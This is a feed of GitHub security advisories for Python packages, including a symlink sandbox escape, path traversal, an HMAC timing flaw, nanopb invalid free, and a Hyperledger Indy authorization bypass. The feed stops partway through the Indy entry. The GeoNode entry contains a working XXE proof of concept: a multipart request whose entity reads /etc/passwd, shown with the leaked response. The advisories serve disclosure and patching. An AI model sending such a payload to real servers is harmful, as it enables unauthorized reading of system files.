<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-08-30T23:02:15.246Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ansible] Ansible Sandbox Escape via Symlink Attack]]></title>
        <id>https://github.com/advisories/GHSA-wwwh-47wp-m522</id>
        <link href="https://github.com/advisories/GHSA-wwwh-47wp-m522"/>
        <updated>2024-08-30T22:01:32.000Z</updated>
        <content type="html"><![CDATA[<p>The chroot, jail, and zone connection plugins in ansible before 1.9.2 allow local users to escape a restricted environment via a symlink attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-6240">https://nvd.nist.gov/vuln/detail/CVE-2015-6240</a></li>
<li><a href="https://github.com/ansible/ansible/commit/952166f48eb0f5797b75b160fd156bbe1e8fc647">https://github.com/ansible/ansible/commit/952166f48eb0f5797b75b160fd156bbe1e8fc647</a></li>
<li><a href="https://github.com/ansible/ansible/commit/ca2f2c4ebd7b5e097eab0a710f79c1f63badf95b">https://github.com/ansible/ansible/commit/ca2f2c4ebd7b5e097eab0a710f79c1f63badf95b</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1243468">https://bugzilla.redhat.com/show_bug.cgi?id=1243468</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2019/09/msg00016.html">https://lists.debian.org/debian-lts-announce/2019/09/msg00016.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2015/08/17/10">http://www.openwall.com/lists/oss-security/2015/08/17/10</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2017-3.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2017-3.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-wwwh-47wp-m522">https://github.com/advisories/GHSA-wwwh-47wp-m522</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wwwh-47wp-m522</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-13T01:54:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aim] Arbitrary file reading vulnerability in Aim]]></title>
        <id>https://github.com/advisories/GHSA-8phj-f9w2-cjcc</id>
        <link href="https://github.com/advisories/GHSA-8phj-f9w2-cjcc"/>
        <updated>2024-08-30T21:51:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A path traversal attack aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.</p>
<p>Vulnerable code: <a href="https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16">https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16</a></p>
<h3 id="patches">Patches</h3>
<p>The vulnerability issue is resolved in Aim v3.1.0.</p>
<h3 id="references">References</h3>
<p><a href="https://owasp.org/www-community/attacks/Path_Traversal">https://owasp.org/www-community/attacks/Path_Traversal</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aimhubio/aim/security/advisories/GHSA-8phj-f9w2-cjcc">https://github.com/aimhubio/aim/security/advisories/GHSA-8phj-f9w2-cjcc</a></li>
<li><a href="https://github.com/aimhubio/aim/pull/1003">https://github.com/aimhubio/aim/pull/1003</a></li>
<li><a href="https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16">https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43775">https://nvd.nist.gov/vuln/detail/CVE-2021-43775</a></li>
<li><a href="https://github.com/aimhubio/aim/issues/999">https://github.com/aimhubio/aim/issues/999</a></li>
<li><a href="https://github.com/aimhubio/aim/commit/b9e53df5e32d14bbd3a2c738e2db7187fb531e93">https://github.com/aimhubio/aim/commit/b9e53df5e32d14bbd3a2c738e2db7187fb531e93</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/aim/PYSEC-2021-839.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/aim/PYSEC-2021-839.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8phj-f9w2-cjcc">https://github.com/advisories/GHSA-8phj-f9w2-cjcc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8phj-f9w2-cjcc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-11-23T22:03:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Adyen] Adyen APIs Library for Python timing attack vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f3q4-ggfp-jv34</id>
        <link href="https://github.com/advisories/GHSA-f3q4-ggfp-jv34"/>
        <updated>2024-08-30T18:51:59.000Z</updated>
        <content type="html"><![CDATA[<p>Adyen has utility methods for validating notification HMAC signatures. The <code>is_valid_hmac</code> and <code>is_valid_hmac_notification</code> methods are vulnerable to a timing attack, you should compare the hash of the HMACs instead.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Adyen/adyen-python-api-library/issues/168">https://github.com/Adyen/adyen-python-api-library/issues/168</a></li>
<li><a href="https://github.com/Adyen/adyen-python-api-library/pull/170">https://github.com/Adyen/adyen-python-api-library/pull/170</a></li>
<li><a href="https://github.com/Adyen/adyen-python-api-library/commit/3292133dbc00ffc4cccfb92de672a76eaa587ca5">https://github.com/Adyen/adyen-python-api-library/commit/3292133dbc00ffc4cccfb92de672a76eaa587ca5</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/adyen/PYSEC-2023-1.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/adyen/PYSEC-2023-1.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-f3q4-ggfp-jv34">https://github.com/advisories/GHSA-f3q4-ggfp-jv34</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f3q4-ggfp-jv34</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-30T18:51:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GeoNode] GeoServer style upload functionality vulnerable to XML External Entity (XXE) injection]]></title>
        <id>https://github.com/advisories/GHSA-mcmc-c59m-pqq8</id>
        <link href="https://github.com/advisories/GHSA-mcmc-c59m-pqq8"/>
        <updated>2024-08-30T18:50:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>GeoNode is vulnerable to an XML External Entity (XXE) injection in the style upload functionality of GeoServer leading to Arbitrary File Read.</p>
<h3 id="details">Details</h3>
<p>GeoNode's GeoServer has the ability to upload new styles for datasets through the <a href="https://github.com/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/urls.py#L70-L72"><code>dataset_style_upload</code> view</a>.</p>
<pre><code class="language-py"># https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/views.py#L158-L159
@login_required
def dataset_style_upload(request, layername):
    def respond(*args, **kw):
        kw['content_type'] = 'text/html'
        return json_response(*args, **kw)
    ...
    sld = request.FILES['sld'].read() # 1
    sld_name = None
    try:
        # Check SLD is valid
        ...
        sld_name = extract_name_from_sld(gs_catalog, sld, sld_file=request.FILES['sld']) # 2
    except Exception as e:
        respond(errors=f"The uploaded SLD file is not valid XML: {e}")
    name = data.get('name') or sld_name
    set_dataset_style(layer, data.get('title') or name, sld)
    return respond(
        body={
            'success': True,
            'style': data.get('title') or name, # 3
            'updated': data['update']})
</code></pre>
<p><code>dataset_style_upload</code> gets a user-provided file (<code>1</code>), pass it to <code>extract_name_from_sld</code> to extract an element from it (<code>2</code>) and return the former in the response (<code>3</code>).</p>
<pre><code class="language-py"># https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/helpers.py#L233-L234
def extract_name_from_sld(gs_catalog, sld, sld_file=None):
    try:
        if sld:
            if isfile(sld):
                with open(sld, "rb") as sld_file:
                    sld = sld_file.read() # 1
            if isinstance(sld, str):
                sld = sld.encode('utf-8')
            dom = etree.XML(sld) # 2
        ...
    named_dataset = dom.findall(
        "{http://www.opengis.net/sld}NamedLayer")
    el = None
    if named_dataset and len(named_dataset) &gt; 0:
        user_style = named_dataset[0].findall("{http://www.opengis.net/sld}UserStyle")
        if user_style and len(user_style) &gt; 0:
            el = user_style[0].findall("{http://www.opengis.net/sld}Name") # 3
    ...
    return el[0].text # 4
</code></pre>
<p><code>extract_name_from_sld</code> uses <code>sld</code> (which is a path to the provided file), reads it (<code>1</code>) and parses it with <a href="https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1312"><code>etree.XML</code></a> in <code>2</code>. Since the former uses a <a href="https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1323-L1324">default XMLParser</a>, the parsing gets done with the <a href="https://lxml.de/api/lxml.etree.XMLParser-class.html#:~:text=resolve_entities%3DTrue"><code>resolve_entities</code> flag set to <code>True</code></a>. Therefore, <code>dom</code> handles the parsed XML containing the resolved entity (<code>2</code>), gets <code>NamedLayer.UserStyle.Name</code> in <code>3</code> and returns the resolved content in <code>4</code>.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a guest/non-privileged account and log in.</li>
<li>Upload a dataset through <code>/catalogue/#/upload/dataset</code> whose name we will be referencing as <code>&lt;DATASET_NAME&gt;</code>.</li>
<li>Send the following request that will try to upload a new style for the dataset. The response will be returning the resolved entity with the contents of <code>/etc/passwd</code>:</li>
</ol>
<pre><code>POST /gs/geonode:&lt;DATASET_NAME&gt;/style/upload HTTP/1.1
Host: localhost
Cookie: django_language=en-us; csrftoken=&lt;CSRF-TOKEN&gt;; sessionid=&lt;SESSION-COOKIE&gt;
X-Csrftoken: &lt;CSRF-TOKEN&gt;
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfoo
Content-Length: 485
------WebKitFormBoundaryfoo
Content-Disposition: form-data; name="layerid"
1
------WebKitFormBoundaryfoo
Content-Disposition: form-data; name="sld"; filename="foo.sld"
Content-Type: application/octet-stream
&lt;?xml version="1.0" standalone="yes"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY ent SYSTEM "/etc/passwd" &gt; ]&gt;
&lt;foo xmlns="http://www.opengis.net/sld"&gt;
  &lt;NamedLayer&gt;
    &lt;UserStyle&gt;
        &lt;Name&gt;&amp;ent;&lt;/Name&gt;
    &lt;/UserStyle&gt;
  &lt;/NamedLayer&gt;
&lt;/foo&gt;
------WebKitFormBoundaryfoo--
</code></pre>
<p>Sample response:</p>
<pre><code>HTTP/1.1 200 OK
Server: nginx/1.23.2
...
{"success": true, "style": "root:x:0:0:root:/root:/bin/bash...", "updated": false}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue may lead to authenticated <code>Arbitrary File Read</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GeoNode/geonode/security/advisories/GHSA-mcmc-c59m-pqq8">https://github.com/GeoNode/geonode/security/advisories/GHSA-mcmc-c59m-pqq8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26043">https://nvd.nist.gov/vuln/detail/CVE-2023-26043</a></li>
<li><a href="https://github.com/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0">https://github.com/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2023-15.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2023-15.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-mcmc-c59m-pqq8">https://github.com/advisories/GHSA-mcmc-c59m-pqq8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcmc-c59m-pqq8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-30T18:50:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lti-consumer-xblock] LTI 1.3 Grade Pass Back Implementation has Missing Authorization Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7j9p-67mm-5g87</id>
        <link href="https://github.com/advisories/GHSA-7j9p-67mm-5g87"/>
        <updated>2024-08-30T18:47:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="problem">Problem</h3>
<p>TL;DR: Any LTI tool that is integrated with on the Open edX platform can
post a grade back for any LTI XBlock so long as it knows or can guess the
block location for that XBlock.</p>
<p>In LTI 1.3, LTI tools can "pass back" scores that learners earn while using
LTI tools to the edX platform. The edX platform then stores those LTI
scores in a separate table. If the right conditions are met, these scores
are then persisted to the LMS grades tables.</p>
<p>LTI tools can create what are called "line items" on the edX platform. A
line item can be thought of as a column in a grade book; it stores results
for a specific activity (i.e. XBlock) for a specific set of users (i.e.
users in the course using the XBlock). A line item has an optional
resource_link_id field, which is basically the XBlock location. An LTI tool
can supply any value for this field.</p>
<p>An LTI tool submits scores to the edX platform for line items. The code
that uploads that score to the LMS grade tables determines which XBlock to
upload the grades for by reading the resource_link_id field of the
associated line item. Because the LTI tool could have submitted any value
for the resource_link_id field, this introduces the potential for a
nefarious LTI tool to submit scores for any LTI XBlock on the platform.</p>
<h3 id="impact">Impact</h3>
<p>Any LTI tool that is integrated with on the Open edX platform can post a
grade back for any LTI XBlock so long as it knows the resource_link_id
(i.e. block location) for that XBlock.</p>
<p>The impact is a loss of integrity for LTI XBlock grades.</p>
<h3 id="patches">Patches</h3>
<p>No available patch</p>
<h3 id="workarounds">Workarounds</h3>
<p>No</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openedx/xblock-lti-consumer/security/advisories/GHSA-7j9p-67mm-5g87">https://github.com/openedx/xblock-lti-consumer/security/advisories/GHSA-7j9p-67mm-5g87</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23611">https://nvd.nist.gov/vuln/detail/CVE-2023-23611</a></li>
<li><a href="https://github.com/openedx/xblock-lti-consumer/commit/252f94bd182cd0962af9251015930cb55ec515d7">https://github.com/openedx/xblock-lti-consumer/commit/252f94bd182cd0962af9251015930cb55ec515d7</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/lti-consumer-xblock/PYSEC-2023-21.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/lti-consumer-xblock/PYSEC-2023-21.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-7j9p-67mm-5g87">https://github.com/advisories/GHSA-7j9p-67mm-5g87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j9p-67mm-5g87</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-30T18:47:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nanopb] nanopb vulnerable to invalid free() call with oneofs and PB_ENABLE_MALLOC]]></title>
        <id>https://github.com/advisories/GHSA-7mv5-5mxh-qg88</id>
        <link href="https://github.com/advisories/GHSA-7mv5-5mxh-qg88"/>
        <updated>2024-08-30T18:45:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Decoding a specifically formed message can cause invalid <code>free()</code> or <code>realloc()</code> calls if the message type contains an <code>oneof</code> field, and the <code>oneof</code> directly contains both a pointer field and a non-pointer field. If the message data first contains the non-pointer field and then the pointer field, the data of the non-pointer field is incorrectly treated as if it was a pointer value. Such message data rarely occurs in normal messages, but it is a concern when untrusted data is parsed.</p>
<h3 id="patches">Patches</h3>
<p>Preliminary patch is available on git for <a href="https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261">0.4.x</a> and <a href="https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c">0.3.x</a> branches. The fix will be released in versions 0.3.9.8 and 0.4.5 once testing has been completed.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Following workarounds are available:</p>
<ul>
<li>Set the option <code>no_unions</code> for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.</li>
<li>Set the type of all fields inside the oneof to <code>FT_POINTER</code>. This ensures that the data contained inside the <code>union</code> is always a valid pointer.</li>
<li>Heap implementations that guard against invalid <code>free()</code> provide a partial mitigation. Depending on the message type, the pointer value may be attacker controlled and can be used to bypass heap protections.</li>
</ul>
<h3 id="references">References</h3>
<p>Bug report: <a href="https://github.com/nanopb/nanopb/issues/647">https://github.com/nanopb/nanopb/issues/647</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, comment on the bug report linked above.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88">https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21401">https://nvd.nist.gov/vuln/detail/CVE-2021-21401</a></li>
<li><a href="https://github.com/nanopb/nanopb/issues/647">https://github.com/nanopb/nanopb/issues/647</a></li>
<li><a href="https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c">https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c</a></li>
<li><a href="https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261">https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261</a></li>
<li><a href="https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1">https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-7mv5-5mxh-qg88">https://github.com/advisories/GHSA-7mv5-5mxh-qg88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mv5-5mxh-qg88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-30T18:45:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nanopb] nanopb vulnerable to invalid free() call with oneofs and PB_ENABLE_MALLOC]]></title>
        <id>https://github.com/advisories/GHSA-7mv5-5mxh-qg88</id>
        <link href="https://github.com/advisories/GHSA-7mv5-5mxh-qg88"/>
        <updated>2024-08-30T18:45:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Decoding a specifically formed message can cause invalid <code>free()</code> or <code>realloc()</code> calls if the message type contains an <code>oneof</code> field, and the <code>oneof</code> directly contains both a pointer field and a non-pointer field. If the message data first contains the non-pointer field and then the pointer field, the data of the non-pointer field is incorrectly treated as if it was a pointer value. Such message data rarely occurs in normal messages, but it is a concern when untrusted data is parsed.</p>
<h3 id="patches">Patches</h3>
<p>Preliminary patch is available on git for <a href="https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261">0.4.x</a> and <a href="https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c">0.3.x</a> branches. The fix will be released in versions 0.3.9.8 and 0.4.5 once testing has been completed.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Following workarounds are available:</p>
<ul>
<li>Set the option <code>no_unions</code> for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.</li>
<li>Set the type of all fields inside the oneof to <code>FT_POINTER</code>. This ensures that the data contained inside the <code>union</code> is always a valid pointer.</li>
<li>Heap implementations that guard against invalid <code>free()</code> provide a partial mitigation. Depending on the message type, the pointer value may be attacker controlled and can be used to bypass heap protections.</li>
</ul>
<h3 id="references">References</h3>
<p>Bug report: <a href="https://github.com/nanopb/nanopb/issues/647">https://github.com/nanopb/nanopb/issues/647</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, comment on the bug report linked above.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88">https://github.com/nanopb/nanopb/security/advisories/GHSA-7mv5-5mxh-qg88</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21401">https://nvd.nist.gov/vuln/detail/CVE-2021-21401</a></li>
<li><a href="https://github.com/nanopb/nanopb/issues/647">https://github.com/nanopb/nanopb/issues/647</a></li>
<li><a href="https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c">https://github.com/nanopb/nanopb/commit/4a375a560651a86726e5283be85a9231fd0efe9c</a></li>
<li><a href="https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261">https://github.com/nanopb/nanopb/commit/e2f0ccf939d9f82931d085acb6df8e9a182a4261</a></li>
<li><a href="https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1">https://github.com/nanopb/nanopb/blob/c9124132a604047d0ef97a09c0e99cd9bed2c818/CHANGELOG.txt#L1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nanopb/PYSEC-2021-432.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-7mv5-5mxh-qg88">https://github.com/advisories/GHSA-7mv5-5mxh-qg88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mv5-5mxh-qg88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-30T18:45:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[freewvs] freewvs vulnerable to denial of service through large files]]></title>
        <id>https://github.com/advisories/GHSA-9cfv-9463-8gqv</id>
        <link href="https://github.com/advisories/GHSA-9cfv-9463-8gqv"/>
        <updated>2024-08-30T18:44:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A user could create a large file that freewvs will try to read, which will terminate a scan process.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched by limiting the data freewvs reads:
<a href="https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2">https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-9cfv-9463-8gqv">https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-9cfv-9463-8gqv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15100">https://nvd.nist.gov/vuln/detail/CVE-2020-15100</a></li>
<li><a href="https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2">https://github.com/schokokeksorg/freewvs/commit/18bbf2043e53f69e0119d24f8ae4edb274afb9b2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-232.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-232.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-9cfv-9463-8gqv">https://github.com/advisories/GHSA-9cfv-9463-8gqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cfv-9463-8gqv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-30T18:43:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[freewvs] freewvs's nested directory structure can interrupt scan]]></title>
        <id>https://github.com/advisories/GHSA-7pmh-vrww-25xx</id>
        <link href="https://github.com/advisories/GHSA-7pmh-vrww-25xx"/>
        <updated>2024-08-30T18:43:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A directory structure of more than 1000 nested directories can interrupt a freewvs scan due to Python's recursion limit and os.walk(). This can be problematic in a case where an administrator scans the dirs of potentially untrusted users.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in this commit by limiting the recursion to 500 directories:
<a href="https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143">https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143</a></p>
<p>This issue was discovered by Hanno Böck.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-7pmh-vrww-25xx">https://github.com/schokokeksorg/freewvs/security/advisories/GHSA-7pmh-vrww-25xx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15101">https://nvd.nist.gov/vuln/detail/CVE-2020-15101</a></li>
<li><a href="https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143">https://github.com/schokokeksorg/freewvs/commit/83a6b55c0435c69f447488b791555e6078803143</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-233.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/freewvs/PYSEC-2020-233.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-7pmh-vrww-25xx">https://github.com/advisories/GHSA-7pmh-vrww-25xx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7pmh-vrww-25xx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-30T18:43:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[indy-node] Hyperledger Indy's update process of a DID does not check who signs the request]]></title>
        <id>https://github.com/advisories/GHSA-wh2w-39f4-rpv2</id>
        <link href="https://github.com/advisories/GHSA-wh2w-39f4-rpv2"/>
        <updated>2024-08-30T18:41:17.000Z</updated>
        <content type="html"><![CDATA[<h1>Name</h1>
<p>Updating a DID with a nym transaction will be written to the ledger if neither ROLE or VERKEY are being changed, regardless of sender.</p>
<h1 id="description">Description</h1>
<p>A malicious DID with no particular role can ask an update for another DID (but cannot modify its verkey or role). This is bad because:</p>
<ol>
<li>Any DID can write a nym transaction to the ledger (i.e., any DID can spam the ledger with nym transactions).</li>
<li>Any DID can change any other DID's alias. </li>
<li>The update transaction modifies the ledger metadata associated with a DID.</li>
</ol>
<h1 id="expected-vs-observed">Expected vs Observed</h1>
<p>We expect that if a DID (with no role) wants to update another DID (not its own or one it is the endorser), then the nodes should refuse the request. We can see that requirements in the <a href="https://github.com/hyperledger/indy-node/blob/master/docs/source/auth_rules.md">Indy default auth_rules</a> in Section "Who is the owner" in the last point of "Endorser using". </p>
<p>We observe that with a normal DID, we can update the field <code>from</code> for a random DID, for example, the one of a TRUSTEE. It creates then a new transaction on the ledger.</p>
<h1 id="explanation-of-the-attack">Explanation of the attack</h1>
<p>We first begin to connect to the pool and open a wallet. Then, we will use a TRUSTEE (but can also be a STEWARD or an ENDORSER) DID <code>V4SGRU86Z58d6TV7PBUe6f</code>. We ask the information about <code>V4SGRU86Z58d6TV7PBUe6f</code> with a get-nym. We create a new DID <code>V4SGRU86Z58d6TV7PBUe1a</code> signed by <code>V4SGRU86Z58d6TV7PBUe6f</code> with no role. For the rest of the attack, we will use <code>V4SGRU86Z58d6TV7PBUe1a</code> to sign new transactions. We send a <code>ledger nym did=V4SGRU86Z58d6TV7PBUe6f extra=hello</code> to see if <code>V4SGRU86Z58d6TV7PBUe1a</code> can send an update of a TRUSTEE identity. When we ask information to the ledger about <code>V4SGRU86Z58d6TV7PBUe6f</code>, it answers that the <code>from</code> field is <code>V4SGRU86Z58d6TV7PBUe1a</code> (to compare with the first get-nym we did with <code>from</code> field = <code>V4SGRU86Z58d6TV7PBUe6f</code>). To see the log of the attack, I modified my indy-cli to print the json request and the json response directly on the terminal. You can find the log file <code>indy.log</code> in this archive.</p>
<h1 id="implementation-notes">Implementation notes</h1>
